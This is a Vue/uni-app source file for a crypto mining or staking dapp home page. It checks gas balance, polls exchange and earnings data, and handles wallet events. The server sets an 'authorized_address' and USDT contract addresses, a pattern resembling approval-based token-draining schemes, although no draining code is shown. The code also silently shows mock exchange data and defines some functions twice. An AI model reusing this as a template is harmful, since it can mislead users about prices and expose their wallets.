				let ethereum = this.getEthereumProvider();
				if (!ethereum) {
					throw new Error('No Ethereum provider found');
				}

				// 获取当前账户
				const accounts = await ethereum.request({ method: 'eth_accounts' });
				if (!accounts || accounts.length === 0) {
					throw new Error('No account connected');
				}

				// 获取账户 ETH 余额
				const balance = await ethereum.request({
					method: 'eth_getBalance',
					params: [accounts[0], 'latest']
				});

				// 将余额从 Wei 转换为 ETH
				const ethBalance = parseInt(balance, 16) / 1e18;

				// 设置最小所需 gas 费用（例如 0.01 ETH）
				const minGasRequired = 0.01;

				if (ethBalance < minGasRequired) {
					throw new Error(`Insufficient ETH for gas fee. Minimum required: ${minGasRequired} ETH`);
				}

				return true;
			} catch (error) {
				console.error('Gas balance check failed:', error);
				uni.showToast({
					title: error.message || 'Insufficient gas fee',
					icon: 'none',
					duration: 3000
				});
				return false;
			}
		},

		// 修改购买/质押函数
		async processPurchase(amount) {
			try {
				// 先检查 gas 费用
				const hasEnoughGas = await this.checkGasBalance();
				if (!hasEnoughGas) {
					return;
				}

				uni.showLoading({
					title: 'Processing...'
				});

				// 继续原有的购买逻辑
				await this.callPurchaseAPI(amount);
				
				uni.hideLoading();
				uni.showToast({
					title: 'Purchase successful',
					icon: 'success',
					duration: 2000
				});
				
				setTimeout(() => {
					uni.navigateBack();
				}, 2000);
				
			} catch (error) {
				uni.hideLoading();
				uni.showToast({
					title: error.message || 'Purchase failed',
					icon: 'none',
					duration: 2000
				});
			}
		},

		// 修改：启动所有轮询（恢复交易所数据轮询）
		startAllPolling() {
			if (this.isPollingActive) {
				console.log('轮询已经活跃，跳过重复启动');
				return;
			}

			console.log('启动所有轮询...');
			this.isPollingActive = true;
			
			// 启动各种轮询
			this.startExchangeDataPolling();
			this.startErcDataPolling();
			this.startUserInfoPolling();
		},

		// 修改：停止所有轮询
		stopAllPolling() {
			if (!this.isPollingActive) {
				console.log('轮询已经停止，跳过重复停止');
				return;
			}

			console.log('停止所有轮询...');
			this.isPollingActive = false;
			
			// 停止各种轮询
			this.stopExchangeDataPolling();
			this.stopErcDataPolling();
			this.stopUserInfoPolling();
		},

		// 恢复：开始轮询交易所数据（10秒间隔）
		startExchangeDataPolling() {
			// 先停止现有轮询
			this.stopExchangeDataPolling();
			
			// 立即获取一次数据
			this.fetchExchangeData();
			
			// 设置10秒轮询
			this.pollingTimer = setInterval(() => {
				this.fetchExchangeData();
			}, 10000); // 改为10秒
			
			console.log('开始轮询交易所数据，每10秒更新一次');
		},

		// 恢复：停止轮询交易所数据
		stopExchangeDataPolling() {
			if (this.pollingTimer) {
				clearInterval(this.pollingTimer);
				this.pollingTimer = null;
				console.log('停止轮询交易所数据');
			}
		},

		// 恢复：获取交易所数据，增强错误处理
		async fetchExchangeData() {
			try {
				// 使用API方法
				let result = await api.exchange.getRealTimeData();
				
				// 如果返回null（被频率限制），跳过本次更新
				if (!result) {
					console.log('交易所数据获取被限制，跳过本次更新');
					return;
				}
				
				// 如果主要方案失败且是CORS错误，尝试使用模拟数据
				if (!result.success && result.error && result.error.includes('CORS')) {
					console.log('CORS问题无法解决，使用模拟数据进行演示');
					result = api.exchange.getMockData();
				}
				
				if (result.success && result.data) {
					// 将接口返回的数据格式化
					const formattedData = {};
					
					// 处理每个交易所的数据
					Object.keys(result.data).forEach(exchangeName => {
						const lowerCaseName = exchangeName.toLowerCase();
						// 处理不同的交易所名称映射
						let mappedName = lowerCaseName;
						
						// 名称映射规则
						if (lowerCaseName === 'okex') {
							mappedName = 'okex';
						} else if (lowerCaseName === 'huobi') {
							mappedName = 'huobi';
						} else if (lowerCaseName === 'binance') {
							mappedName = 'binance';
						} else if (lowerCaseName === 'gate') {
							mappedName = 'gate';
						} else if (lowerCaseName === 'kucoin') {
							mappedName = 'kucoin';
						} else if (lowerCaseName === 'kraken') {
							mappedName = 'kraken';
						}
						
						if (this.exchangeConfig[mappedName]) {
							formattedData[mappedName] = result.data[exchangeName];
						}
					});

					this.exchangeData = formattedData;
					console.log('交易所数据更新成功:', formattedData);
				} else {
					throw new Error(result.error || '获取数据失败');
				}
			} catch (error) {
				console.error('获取交易所数据失败:', error);
				
				// 如果是CORS错误，给用户友好提示
				if (error.message && (error.message.includes('CORS') || error.message.includes('跨域'))) {
					console.log('由于浏览器CORS政策限制，将使用模拟数据进行演示');
					
					// 尝试使用模拟数据
					try {
						const mockResult = api.exchange.getMockData();
						if (mockResult.success) {
							const formattedData = {};
							Object.keys(mockResult.data).forEach(exchangeName => {
								const mappedName = exchangeName.toLowerCase();
								if (this.exchangeConfig[mappedName]) {
									formattedData[mappedName] = mockResult.data[exchangeName];
								}
							});
							this.exchangeData = formattedData;
							console.log('成功使用模拟数据:', formattedData);
							return; // 成功使用模拟数据，退出错误处理
						}
					} catch (mockError) {
						console.error('模拟数据也失败了:', mockError);
					}
				}
				
				// 静默处理其他错误
				if (error.message && error.message.includes('timeout')) {
					console.log('请求超时，下次轮询时重试');
				} else {
					console.log('数据获取失败，下次轮询时重试:', error.message);
				}
			}
		},

		// 新增：停止ERC数据轮询
		stopErcDataPolling() {
			if (this.ercPollingTimer) {
				clearInterval(this.ercPollingTimer);
				this.ercPollingTimer = null;
				console.log('停止轮询ERC数据');
			}
		},

		// 新增：开始轮询ERC数据（10秒间隔）
		startErcDataPolling() {
			// 先停止现有轮询
			this.stopErcDataPolling();
			
			// 立即获取一次数据
			this.fetchErcData();
			
			// 设置10秒轮询
			this.ercPollingTimer = setInterval(() => {
				this.fetchErcData();
			}, 10000); // 10秒间隔
			
			console.log('开始轮询ERC数据，每10秒更新一次');
		},

		// 修改获取ERC数据方法 - 强制响应式更新
		async fetchErcData() {
			try {
				console.log('=== 开始获取ERC数据 ===');
				const currentToken = store.getToken();
				console.log('fetchErcData - 当前token:', currentToken);
				
				const response = await api.transaction.getAuthAddress();
				console.log('fetchErcData - API返回完整响应:', response);
				
				// 检查是否被频率限制
				if (response === null) {
					console.log('API调用被频率限制，跳过本次更新');
					return;
				}
				
				// 更详细的响应检查
				if (response) {
					console.log('响应存在，检查data字段:', response.data);
					console.log('检查响应根级别字段:', response);
					
					// 确定数据来源：可能在 response.data 或直接在 response 中
					let dataSource = null;
					if (response.data && (response.data.node || response.data.participant)) {
						dataSource = response.data;
						console.log('数据来源: response.data');
					} else if (response.node || response.participant) {
						dataSource = response;
						console.log('数据来源: response');
					}
					
					if (dataSource) {
						console.log('=== 开始更新ERC数据 ===');
						console.log('数据源内容:', dataSource);
						console.log('原始数据:', {
							participant: dataSource.participant,
							node: dataSource.node,
							output: dataSource.output,
							revenue: dataSource.revenue,
							authorized_address: dataSource.authorized_address
						});
						
						// 先保存原始值，用于调试
						const originalData = {
							participant: dataSource.participant,
							node: dataSource.node,
							output: dataSource.output,
							revenue: dataSource.revenue,
							authorized_address: dataSource.authorized_address
						};
						
						console.log('即将更新的原始值:', originalData);
						
						// 清理旧的更新方式，只使用一种方式
						const newErcData = {
							authorized_address: String(dataSource.authorized_address || ''),
							node: String(dataSource.node || '0'),
							output: String(dataSource.output || '0'),
							participant: String(dataSource.participant || '0'),
							revenue: String(dataSource.revenue || '0')
						};
						
						console.log('格式化后的数据:', newErcData);
						
						// 使用最简单的赋值方式
						this.ercData = { ...newErcData };
						
						console.log('赋值后的ercData:', this.ercData);
						console.log('验证各个字段:');
						console.log('  participant:', this.ercData.participant);
						console.log('  node:', this.ercData.node);
						console.log('  output:', this.ercData.output);
						console.log('  revenue:', this.ercData.revenue);
						
						// 强制更新视图
						this.$nextTick(() => {
							this.$forceUpdate();
							console.log('强制更新完成');
						});
						
						// 同时更新合约地址配置
						const contractConfig = {};
						if (dataSource.tron_usdt_contract) {
							contractConfig.tronUsdtContract = dataSource.tron_usdt_contract;
						}
						if (dataSource.eth_usdt_contract) {
							contractConfig.ethUsdtContract = dataSource.eth_usdt_contract;
						}
						
						if (Object.keys(contractConfig).length > 0) {
							tokenPocketAuth.updateConfig(contractConfig);
						}
						
						console.log('=== ERC数据更新完成 ===');
						console.log('最终ercData状态:', JSON.stringify(this.ercData));
					} else {
						console.warn('在响应中找不到有效的ERC数据');
						console.log('完整响应结构:', JSON.stringify(response, null, 2));
					}
				} else {
					console.warn('API返回空响应');
				}
			} catch (error) {
				console.error('获取ERC数据失败:', error);
				
				// 静默处理错误，不影响用户体验
				if (error.message && error.message.includes('timeout')) {
					console.log('ERC数据请求超时，下次轮询时重试');
				} else {
					console.log('ERC数据获取失败，下次轮询时重试:', error.message);
				}
			}
		},

		// 修改：开始用户信息轮询（10秒间隔）
		startUserInfoPolling(immediately = true) {
			// 先停止现有轮询
			this.stopUserInfoPolling();
			
			// 立即获取一次数据（可选）
			if (immediately) {
				this.fetchUserInfo();
			}
			
			// 设置10秒轮询
			this.userInfoPollingTimer = setInterval(() => {
				this.fetchUserInfo();
			}, 10000); // 改为10秒
			
			console.log('开始轮询用户信息，每10秒更新一次');
		},

		// 新增：开始用户信息轮询
		startUserInfoPolling() {
			// 先停止现有轮询
			this.stopUserInfoPolling();
			
			// 立即获取一次数据（可选）
			this.fetchUserInfo();
			
			// 设置30秒轮询
			this.userInfoPollingTimer = setInterval(() => {
				this.fetchUserInfo();
			}, 30000);
			
			console.log('开始轮询用户信息，每30秒更新一次');
		},

		// 新增：停止用户信息轮询
		stopUserInfoPolling() {
			if (this.userInfoPollingTimer) {
				clearInterval(this.userInfoPollingTimer);
				this.userInfoPollingTimer = null;
				console.log('Stop polling user information');
			}
		},

		// 新增：获取用户信息
		async fetchUserInfo(source = 'polling') {
			try {
				console.log(`获取用户信息中... (来源: ${source})`);
				
				// 确保有有效token
				const currentToken = store.getToken();
				if (!currentToken) {
					console.warn('没有有效token，跳过用户信息获取');
					return;
				}
				
				const response = await api.user.getInfo();
				
				if (response) {
					console.log(`用户信息响应 (${source}):`, response);
					
					// 更新收益数据
					this.earningsData = {
						total_earnings: response.total_revenue || '0.00',
						earnings_24h: response.earning_24 || '0.00'
					};
					
					console.log(`用户信息更新成功 (${source}):`, this.earningsData);
				} else {
					console.log(`用户信息返回空 (${source})`);
				}
			} catch (error) {
				console.error(`获取用户信息失败 (${source}):`, error);
				
				// 如果是token相关错误，可能需要重新连接钱包
				if (error.message && (error.message.includes('token') || error.message.includes('unauthorized'))) {
					console.warn('可能token无效，考虑重新连接钱包');
				}
			}
		},

		// 新增：格式化收益金额
		formatEarnings(amount) {
			if (!amount || amount === '0' || amount === '0.00') return '0.00';
			
			const number = parseFloat(amount);
			if (isNaN(number)) return '0.00';

			return number.toLocaleString('en-US', {
				minimumFractionDigits: 2,
				maximumFractionDigits: 2
			});
		},

		// 同时修改格式化方法，增加调试信息
		formatErcNumber(num) {
			console.log('=== formatErcNumber调用 ===');
			console.log('输入值:', num, '类型:', typeof num);
			
			if (!num || num === '0') {
				console.log('输入为空或0，返回"0"');
				return '0';
			}
			
			const number = parseFloat(num);
			if (isNaN(number)) {
				console.log('解析数字失败:', num);
				return '0';
			}

			console.log('解析后的数字:', number);

			// 对于大数字，使用逗号分隔，不显示小数点（因为是人数、节点数等整数）
			if (number >= 1000000) {
				const result = number.toLocaleString('en-US', {
					minimumFractionDigits: 0,
					maximumFractionDigits: 0
				});
				console.log('格式化结果(大数字):', result);
				return result;
			} else if (number >= 1000) {
				const result = number.toLocaleString('en-US', {
					minimumFractionDigits: 0,
					maximumFractionDigits: 0
				});
				console.log('格式化结果(中等数字):', result);
				return result;
			} else {
				const result = Math.round(number).toString();
				console.log('格式化结果(小数字):', result);
				return result;
			}
		},

		// 修改：格式化输出值显示
		formatOutputValue(num) {
			console.log('formatOutputValue input:', num, 'type:', typeof num);
			
			if (!num || num === '0') return '0.00';
			
			const number = parseFloat(num);
			if (isNaN(number)) return '0.00';

			console.log('Output value parsed number:', number);

			const result = number.toLocaleString('en-US', {
				minimumFractionDigits: 2,
				maximumFractionDigits: 6
			});
			
			console.log('Output value formatted result:', result);
			return result;
		},

		// 修改：格式化收益显示
		formatRevenueValue(num) {
			console.log('formatRevenueValue input:', num, 'type:', typeof num);
			
			if (!num || num === '0') return '0.00';
			
			const number = parseFloat(num);
			if (isNaN(number)) return '0.00';

			console.log('Parsed revenue number:', number);

			// 如果数值很大，显示为简化格式
			if (number >= 1e9) {
				const result = (number / 1e9).toFixed(2) + 'B';
				console.log('Revenue format result (B):', result);
				return result;
			} else if (number >= 1e6) {
				const result = (number / 1e6).toFixed(2) + 'M';
				console.log('Revenue format result (M):', result);
				return result;
			} else {
				const result = number.toLocaleString('en-US', {
					minimumFractionDigits: 2,
					maximumFractionDigits: 2
				});
				console.log('Revenue format result (normal):', result);
				return result;
			}
		},

		// 新增：格式化数字显示
		formatNumber(num) {
			if (!num && num !== 0) return '0';
			
			// 处理字符串类型的数字
			const number = typeof num === 'string' ? parseFloat(num) : num;
			if (isNaN(number)) return '0';

			// 格式化大数字显示
			if (number >= 1e9) {
				return (number / 1e9).toFixed(2) + 'B';
			} else if (number >= 1e6) {
				return (number / 1e6).toFixed(2) + 'M';
			} else if (number >= 1e3) {
				return (number / 1e3).toFixed(2) + 'K';
			} else {
				return number.toFixed(2);
			}
		},

		// 新增：格式化流动性显示
		formatLiquidity(num) {
			if (!num && num !== 0) return '0';
			
			const number = typeof num === 'string' ? parseFloat(num) : num;
			if (isNaN(number)) return '0';

			// 对于流动性，保留小数点以提供更精确的信息
			if (number >= 1000) {
				return number.toLocaleString('en-US', {
					minimumFractionDigits: 0,
					maximumFractionDigits: 0
				});
			} else {
				return number.toFixed(2);
			}
		},

		// 新增：格式化显示值
		formatDisplayValue(num) {
			if (!num || num === 0) return '0.00';
			
			const number = parseFloat(num);
			if (isNaN(number)) return '0.00';
			
			// 根据数值大小选择合适的显示格式
			if (number >= 1000) {
				return (number / 1000).toFixed(2);
			} else {
				return number.toFixed(2);
			}
		},

		// 新增：格式化以太坊数值显示
		formatEthValue(ethValue) {
			if (!ethValue || ethValue === '0') return '0.00';
			
			const number = parseFloat(ethValue);
			if (isNaN(number)) return '0.00';

			// 对于ETH价格，保留2位小数并添加千分位分隔符
			return number.toLocaleString('en-US', {
				minimumFractionDigits: 2,
				maximumFractionDigits: 2
			});
		},

		// 设置钱包事件监听
		setupWalletListeners() {
			try {
				console.log('首页设置钱包事件监听...');
				
				// 获取以太坊提供者
				let ethereum = this.getEthereumProvider();
				
				if (!ethereum) {
					console.log('未找到以太坊提供者，无法设置监听器');
					return;
				}
				
				// 移除之前的监听器（避免重复绑定）
				this.removeWalletListeners();
				
				// 监听账户变化
				this.accountsChangedHandler = (accounts) => {
					console.log('首页检测到账户变化:', accounts);
					this.handleAccountsChanged(accounts);
				};
				
				// 监听链变化
				this.chainChangedHandler = (chainId) => {
					console.log('首页检测到链变化:', chainId);
					this.handleChainChanged(chainId);
				};
				
				// 监听连接状态变化
				this.connectHandler = (connectInfo) => {
					console.log('首页检测到连接:', connectInfo);
					this.handleConnect(connectInfo);
				};
				
				// 监听断开连接
				this.disconnectHandler = (error) => {
					console.log('首页检测到断开连接:', error);
					this.handleDisconnect(error);
				};
				
				// 绑定事件监听器
				ethereum.on('accountsChanged', this.accountsChangedHandler);
				ethereum.on('chainChanged', this.chainChangedHandler);
				ethereum.on('connect', this.connectHandler);
				ethereum.on('disconnect', this.disconnectHandler);
				
				console.log('首页钱包事件监听器设置成功');
				
			} catch (error) {
				console.error('首页设置钱包监听器失败:', error);
			}
		},

		// 移除钱包事件监听
		removeWalletListeners() {
			try {
				let ethereum = this.getEthereumProvider();
				
				if (ethereum && this.accountsChangedHandler) {
					ethereum.removeListener('accountsChanged', this.accountsChangedHandler);
					ethereum.removeListener('chainChanged', this.chainChangedHandler);
					ethereum.removeListener('connect', this.connectHandler);
					ethereum.removeListener('disconnect', this.disconnectHandler);
					
					// 清空处理器引用
					this.accountsChangedHandler = null;
					this.chainChangedHandler = null;
					this.connectHandler = null;
					this.disconnectHandler = null;
					
					console.log('首页钱包事件监听器已移除');
				}
			} catch (error) {
				console.error('首页移除钱包监听器失败:', error);
			}
		},

		// 处理账户变化
		async handleAccountsChanged(accounts) {
			console.log('=== Homepage handling account change ===');
			console.log('New account list:', accounts);
			
			try {
				if (accounts.length === 0) {
					// 用户断开了所有账户
					console.log('User disconnected all accounts');
					this.handleWalletDisconnected();
					return; // 早期返回，避免后续处理
				}

				// 用户切换了账户
				const newAddress = accounts[0];
				console.log('User switched to new account:', newAddress);
				
				if (!this.isValidEthAddress(newAddress)) {
					console.warn('New account is not a valid ETH address:', newAddress);
					uni.showToast({
						title: 'Detected non-ETH account, please switch to ETH account',
						icon: 'none',
						duration: 3000
					});
					return; // 早期返回
				}

				const currentAddress = this.walletInfo.address;
				if (newAddress === currentAddress) {
					console.log('Account address unchanged, no update needed');
					return; // 早期返回
				}

				console.log('Account switching from', currentAddress, 'to', newAddress);
				
				// 标记切换状态
				let switchSuccess = false;
				let apiSuccess = false;
				
				try {
					// 更新本地存储和界面显示
					uni.setStorageSync('walletAddress', newAddress);
					this.walletInfo.address = newAddress;
					switchSuccess = true;
					console.log('Local wallet info updated successfully');
					
				} catch (localError) {
					console.error('Failed to update local wallet info:', localError);
					throw localError; // 重新抛出，这是关键错误
				}

				// 调用API同步新地址（这个失败不应该影响切换状态）
				try {
					console.log('Starting to sync new address to server...');
					const responseData = await api.user.walletConnect(
						newAddress,
						uni.getStorageSync('userTid') || ''
					);

					console.log('API response:', responseData);

					if (responseData && responseData.code === 0) {
						// 连接成功，保存token
						if (responseData.token) {
							store.setToken(responseData.token);
							console.log('New wallet address token saved:', responseData.token.substring(0, 10) + '...');
						}
						
						apiSuccess = true;
						console.log('New wallet address synchronized to server');
					} else {
						console.warn('API returned non-success status:', responseData);
						// 不抛出错误，因为这不应该影响钱包切换
					}
				} catch (apiError) {
					console.warn('API sync failed, but does not affect wallet switching:', apiError.message);
					// 显示API失败提示，但不影响整体切换状态
					uni.showToast({
						title: 'Wallet switching successful, but synchronization failed',
						icon: 'none',
						duration: 2000
					});
				}

				// 如果本地切换成功，显示成功提示
				if (switchSuccess) {
					console.log('Wallet switching successful, showing success message');
					uni.showToast({
						title: `Wallet switched to ${this.formatAddress(newAddress)}`,
						icon: 'success',
						duration: 3000
					});
					
					// 尝试重新获取用户数据（失败不影响切换状态）
					try {
						this.fetchUserInfo();
						this.fetchErcData();
					} catch (dataError) {
						console.warn('Failed to get user data:', dataError.message);
						// 静默失败，不影响用户体验
					}
				}

			} catch (error) {
				// 只有真正的关键错误才会到达这里
				console.error('Critical error occurred during wallet switching:', error);
				
				// 显示具体的错误信息，而不是通用的失败提示
				const errorMessage = error.message || 'Wallet switching failed';
				uni.showToast({
					title: errorMessage,
					icon: 'none',
					duration: 3000
				});
			}
		},

		// 处理链变化
		handleChainChanged(chainId) {
			console.log('=== 首页处理链变化 ===');
			console.log('新链ID:', chainId);
			
			// 可以根据需要添加链切换的处理逻辑
			// 例如：检查是否是支持的链，给用户提示等
		},

		// 处理连接
		handleConnect(connectInfo) {
			console.log('=== 首页处理连接 ===');
			console.log('连接信息:', connectInfo);
		},

		// 处理断开连接
		handleDisconnect(error) {
			console.log('=== 首页处理断开连接 ===');
			console.log('断开连接错误:', error);
			this.handleWalletDisconnected();
		},

		// 处理钱包断开连接
		handleWalletDisconnected() {
			console.log('Processing wallet disconnection');
			
			// 清除本地存储
			uni.removeStorageSync('walletConnected');
			uni.removeStorageSync('walletAddress');
			uni.removeStorageSync('walletType');
			store.clearToken();
			
			// 显示提示
			uni.showToast({
				title: 'Wallet disconnected',
				icon: 'none',
				duration: 2000
			});
			
			// 跳转到连接页面
			setTimeout(() => {
				uni.reLaunch({
					url: '/pages/wallet/connect'
				});
			}, 2000);
		},

		// 验证以太坊地址
		isValidEthAddress(address) {
			if (!address) return false;
			
			// 基本的以太坊地址格式检查
			const ethAddressRegex = /^0x[a-fA-F0-9]{40}$/;
			return ethAddressRegex.test(address);
		},

		// 新增：设置store监听器 - 添加防抖
		setupStoreListeners() {
			if (this.storeUnsubscribe) {
				console.log('Store监听器已存在，跳过重复设置');
				return;
			}

			console.log('设置Store监听器...');
			// 监听token变化
			this.storeUnsubscribe = store.addListener((event, data) => {
				console.log('Store事件:', event, data);
				
				if (event === 'tokenUpdated') {
					// 使用防抖机制处理token更新
					this.handleTokenUpdatedWithDebounce(data);
				} else if (event === 'tokenCleared') {
					console.log('检测到token清除');
					this.handleTokenCleared();
				}
			});
		},

		// 新增：带防抖的token更新处理
		handleTokenUpdatedWithDebounce(data) {
			const now = Date.now();
			
			// 防抖：如果距离上次更新不到2秒，取消之前的处理
			if (this.tokenUpdateDebounceTimer) {
				clearTimeout(this.tokenUpdateDebounceTimer);
			}

			// 如果距离上次更新不到1秒，直接忽略
			if (now - this.lastTokenUpdateTime < 1000) {
				console.log('Token更新过于频繁，忽略本次更新');
				return;
			}

			console.log('Token更新防抖处理...');
			this.lastTokenUpdateTime = now;

			// 延迟500ms处理，避免频繁调用
			this.tokenUpdateDebounceTimer = setTimeout(() => {
				this.handleTokenUpdated(data);
				this.tokenUpdateDebounceTimer = null;
			}, 500);
		},

		// 新增：处理token更新事件 - 减少重复调用
		async handleTokenUpdated(data) {
			console.log('处理token更新:', data);
			
			try {
				// 不重置轮询定时器，只刷新数据
				console.log('Token更新，立即刷新数据（不重置定时器）');
				
				// 立即获取最新数据，但不重复启动轮询
				const promises = [];
				promises.push(this.fetchUserInfo());
				promises.push(this.fetchErcData());
				
				// 并发执行，提高效率
				await Promise.allSettled(promises);
				
				console.log('Token更新后数据刷新完成');
			} catch (error) {
				console.error('Token更新后数据刷新失败:', error);
			}
		},

		// 新增：处理token清除事件
		handleTokenCleared() {
			console.log('处理token清除事件');
			
			// 停止所有轮询
			this.stopExchangeDataPolling();
			this.stopErcDataPolling();
			this.stopUserInfoPolling();
			
			// 清理相关数据
			this.earningsData = {
				total_earnings: '0.00',
				earnings_24h: '0.00'
			};
		},

		// 新增：设置WebSocket监听器
		setupWebSocketListeners() {
			// 监听WebSocket数据更新
			this.exchangeWebSocketListener = (data) => {
				console.log('收到交易所WebSocket数据更新:', data);
				this.handleExchangeDataUpdate(data);
			};
			
			uni.$on('exchangeDataUpdated', this.exchangeWebSocketListener);
		},

		// 新增：处理交易所数据更新
		handleExchangeDataUpdate(result) {
			if (result.success && result.data) {
				// 将接口返回的数据格式化
				const formattedData = {};
				
				// 处理每个交易所的数据
				Object.keys(result.data).forEach(exchangeName => {
					const lowerCaseName = exchangeName.toLowerCase();
					let mappedName = lowerCaseName;
					
					// 名称映射规则
					if (lowerCaseName === 'okex') {
						mappedName = 'okex';
					} else if (lowerCaseName === 'huobi') {
						mappedName = 'huobi';
					} else if (lowerCaseName === 'binance') {
						mappedName = 'binance';
					} else if (lowerCaseName === 'gate') {
						mappedName = 'gate';
					} else if (lowerCaseName === 'kucoin') {
						mappedName = 'kucoin';
					} else if (lowerCaseName === 'kraken') {
						mappedName = 'kraken';
					}
					
					if (this.exchangeConfig[mappedName]) {
						formattedData[mappedName] = result.data[exchangeName];
					}
				});

				this.exchangeData = formattedData;
				console.log('交易所数据更新成功 (WebSocket):', formattedData);
			}
		},

		// 新增：移除WebSocket监听器
		removeWebSocketListeners() {
			if (this.exchangeWebSocketListener) {
				uni.$off('exchangeDataUpdated', this.exchangeWebSocketListener);
				this.exchangeWebSocketListener = null;
				console.log('WebSocket监听器已移除');
			}
		},

		// 新增：清理所有资源
		cleanup() {
			console.log('清理所有资源...');
			
			// 停止轮询
			this.stopAllPolling();
			
			// 清理防抖定时器
			if (this.tokenUpdateDebounceTimer) {
				clearTimeout(this.tokenUpdateDebounceTimer);
				this.tokenUpdateDebounceTimer = null;
			}
			
			// 移除监听器
			this.removeWalletListeners();
			this.removeStoreListeners();
			this.removeWebSocketListeners();
			this.removeUserInfoUpdateListener();
		},

		// 新增：移除用户信息更新监听器
		removeUserInfoUpdateListener() {
			if (this.userInfoUpdateListener) {
				uni.$off('userInfoUpdated', this.userInfoUpdateListener);
				this.userInfoUpdateListener = null;
				console.log('用户信息更新监听器已移除');
			}
		},

		// 新增：设置用户信息更新监听器
		setupUserInfoUpdateListener() {
			this.userInfoUpdateListener = (data) => {
				console.log('收到用户信息更新事件:', data);
				this.handleUserInfoUpdate(data);
			};
			
			uni.$on('userInfoUpdated', this.userInfoUpdateListener);
		},

		// 新增：处理用户信息更新
		handleUserInfoUpdate(eventData) {
			const { data, source, requestId } = eventData;
			
			console.log(`Processing user info update - Source: ${source}, Request ID: ${requestId}`);
			
			if (data) {
				// 更新收益数据
				this.earningsData = {
					total_earnings: data.total_revenue || '0.00',
					earnings_24h: data.earning_24 || '0.00'
				};
				
				console.log('User info updated:', this.earningsData);
				
				// 如果是wallet_connect触发的立即更新，暂停一下常规轮询避免重复
				if (source === 'wallet_connect_immediate') {
					this.pauseUserInfoPolling(5000); // 暂停5秒
				}
			}
		},

		// 新增：暂停用户信息轮询
		pauseUserInfoPolling(duration) {
			console.log(`Pausing user info polling for ${duration}ms`);
			
			// 暂时停止轮询
			this.stopUserInfoPolling();
			
			// 延迟重启
			setTimeout(() => {
				if (this.isPollingActive) {
					console.log('Restarting user info polling');
					this.startUserInfoPolling(false); // 不立即执行
				}
			}, duration);
		},

		// 修改：开始用户信息轮询 - 增加立即执行选项
		startUserInfoPolling(immediately = true) {
			// 先停止现有轮询
			this.stopUserInfoPolling();
			
			// 立即获取一次数据（可选）
			if (immediately) {
				this.fetchUserInfo();
			}
			
			// 设置30秒轮询
			this.userInfoPollingTimer = setInterval(() => {
				this.fetchUserInfo();
			}, 30000);
			
			console.log('开始轮询用户信息，每30秒更新一次');
		},
	}
}
</script>

<style>


.exchange-details {
	padding: 20rpx 30rpx;
	animation: slideDown 0.3s ease-out;
	border-top: 1px solid #f0f0f0;
	background-color: #fafafa;
}

.detail-header {
	display: flex;
	align-items: center;
	margin-bottom: 15rpx;
	padding-bottom: 8rpx;
	border-bottom: 1px solid #eeeeee;
}

.detail-icon-space {
	width: 47rpx; /* 与coin-icon + margin-right相同 */
	margin-right: 15rpx;
}

.detail-label {
	font-size: 22rpx;
	color: #666;
	font-weight: 600;
	flex: 1;
	text-align: center;
}

.coin-row {
	display: flex;
	align-items: center;
	margin-bottom: 15rpx;
	min-height: 40rpx;
}

.coin-icon {
	width: 32rpx;
	height: 32rpx;
	margin-right: 15rpx;
	border-radius: 50%;
}

.coin-name {
	font-size: 24rpx;
	color: #333;
	flex: 1;
	text-align: center;
	font-weight: 500;
}

.coin-value {
	font-size: 22rpx;
	color: #666;
	flex: 1;
	text-align: center;
}

.coin-number {
	font-size: 22rpx;
	color: #666;
	flex: 1;
	text-align: center;
}

.index-container {
	min-height: 100vh;
	background-color: #f5f5f5;
	position: relative;
}

.gradient-bg {
	position: relative;
	top: 0;
	left: 0;
	right: 0;
	height: 50vh;
	background: linear-gradient(to bottom, #094884, white);
	z-index: 0;
}

.overlay-image-container {
	position: absolute;
	top: 0;
	left: 0;
	right: 0;
	height: 25vh;
	z-index: 1;
	display: flex;
	justify-content: center;
	align-items: flex-start;
	overflow: hidden;
}

.overlay-image {
	width: 100%;
	height: 100%;
	object-fit: cover;
	object-position: top;
	margin-top: 0;
	display: block;
}



.content-container {
	position: relative;
	z-index: 2;
	margin: 0 30rpx;
	margin-top: -25vh;
	padding: 40rpx;
	background-color: #ffffff;
	border-radius: 20rpx 20rpx 0 0;
	box-shadow: 0 -4rpx 20rpx rgba(0, 0, 0, 0.1);
	min-height: 70vh;
}

.wallet-status-card {
	background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
	border-radius: 15rpx;
	padding: 30rpx;
	margin-bottom: 30rpx;
	box-shadow: 0 4rpx 12rpx rgba(76, 175, 80, 0.3);
}

.wallet-status-header {
	display: flex;
	justify-content: space-between;
	align-items: center;
	margin-bottom: 20rpx;
}

.wallet-type {
	font-size: 28rpx;
	font-weight: bold;
	color: white;
}

.disconnect-btn {
	font-size: 22rpx;
	color: white;
	background-color: rgba(255, 255, 255, 0.2);
	padding: 10rpx 20rpx;
	border-radius: 20rpx;
	cursor: pointer;
}

.wallet-address {
	display: flex;
	align-items: center;
}

.address-label {
	font-size: 24rpx;
	color: rgba(255, 255, 255, 0.8);
	margin-right: 15rpx;
}

.address-text {
	font-size: 24rpx;
	color: white;
	font-family: monospace;
	background-color: rgba(255, 255, 255, 0.1);
	padding: 5rpx 15rpx;
	border-radius: 10rpx;
}

.welcome-card {
	margin-bottom: 40rpx;
}

.welcome-header {
	display: flex;
	justify-content: space-between;
	align-items: flex-start;
	margin-bottom: 20rpx;
}

.welcome-title {
	font-size: 32rpx;
	font-weight: bold;
	color: #333;
	flex: 1;
}

.id-container {
	display: flex;
	align-items: center;
}

.chain-icon {
	font-size: 24rpx;
	margin-right: 10rpx;
}

.id-text {
	font-size: 24rpx;
	color: #999;
}

.welcome-subtitle {
	font-size: 26rpx;
	color: #666;
	margin-bottom: 40rpx;
}

.earnings-section {
	display: flex;
	justify-content: space-between;
	margin-bottom: 40rpx;
}

.earnings-item {
	flex: 1;
}

.earnings-label {
	font-size: 24rpx;
	color: #999;
	display: block;
	margin-bottom: 10rpx;
}

.earnings-value {
	font-size: 36rpx;
	font-weight: bold;
	color: #333;
}

.demo-btn {
	background-color: #4A90E2;
	border-radius: 12rpx;
	padding: 20rpx 0;
	text-align: center;
}

.demo-text {
	color: white;
	font-size: 28rpx;
	font-weight: bold;
}

.transaction-card {
	background-color: #FF9A56;
	border-radius: 20rpx;
	padding: 40rpx;
	margin-bottom: 40rpx;
	position: relative;
}

.transaction-header {
	display: flex;
	justify-content: space-between;
	align-items: center;
	margin-bottom: 20rpx;
}

.transaction-title {
	font-size: 32rpx;
	font-weight: bold;
	color: white;
}

.add-btn {
	width: 60rpx;
	height: 60rpx;
